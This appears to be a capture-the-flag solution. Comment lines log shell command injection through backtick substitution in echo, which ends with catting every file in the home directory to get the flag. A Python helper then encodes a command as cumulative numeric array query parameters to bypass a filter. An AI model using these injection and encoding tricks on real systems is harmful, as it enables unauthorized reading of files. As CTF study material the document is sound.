###Commands Tried
###echo `echo *`;     Just testing if echo wors
###echo `echo ~/*`;     list home dir and saw a file about flag
###echo `cat ~/*`;      cat all files in home dir and got flag

print('command : ',end='')
command = input().strip()
print('identifier : ',end='')
identifier = input().strip()
command = list(map(ord,list(command)))
for i in range(1,len(command)):
	command[i] = (command[i-1]//256)*256+command[i]
	if command[i]<command[i-1]:
		command[i]+=256
print('?',end='')
for i in command:
	print(identifier+'[]='+str(i)+'&',end='')
print('')
